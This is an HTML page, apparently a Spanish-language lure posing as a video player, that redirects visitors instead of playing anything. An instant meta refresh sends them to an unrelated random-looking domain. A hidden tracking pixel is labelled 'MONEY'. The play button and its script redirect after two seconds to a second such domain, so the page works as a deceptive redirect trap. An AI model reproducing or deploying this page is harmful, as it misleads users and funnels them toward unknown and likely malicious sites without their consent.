  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
    }

    .video-container {
      text-align: center;
    }

    h1 {
      font-size: 24px;
      margin-bottom: 20px;
    }

    .play-button {
      display: inline-block;
      padding: 10px 20px;
      border: 2px solid #000;
      border-radius: 5px;
      background-color: #fff;
      color: #000;
      font-weight: bold;
      text-decoration: none;
      transition: background-color 0.3s, color 0.3s;
    }

    .play-button:hover {
      background-color: #000;
      color: #fff;
    }
  </style>
</head>
  <meta http-equiv="cache-control" content="no-cache"> <img src="//whos.amung.us/pingjs/?k=exito24&amp;t=MONEY&amp;x=https://www.apple.com" style="display:none">

<meta http-equiv="refresh" content="0;url=https://waspishoverhear.com/mcviwe0f?key=dbdde2eb9a613e0ef11f6844277fe58d">
  
  <body>
  <div class="video-container">
    <h1>Reproducir Video</h1>
    <a class="play-button" href="https://curvedheldideal.com/g1s7acqk?key=3d40d6ef0a88ffa72341d709e53301e9" onclick="playVideoAndRedirect(); return false;">Haz clic aquí para reproducir el video</a>
  </div>

  <video id="myVideo" style="display:none;" controls>
    <source src="https://i.imgur.com/KRaJL3a.mp4" type="video/mp4">
    <!-- Añade aquí más formatos de video para mayor compatibilidad -->
  </video>

  <script>
    function playVideoAndRedirect() {
      var video = document.getElementById("myVideo");
      video.style.display = "block";

      video.play();

      setTimeout(function() {
        // Aquí cambia "URL_DE_REDIRECCION" por el enlace que desees redireccionar
        window.location.href = "https://curvedheldideal.com/g1s7acqk?key=3d40d6ef0a88ffa72341d709e53301e9";
      }, 2000); // 2 segundos (2000 milisegundos)
    }
  </script>
</body>
</html>
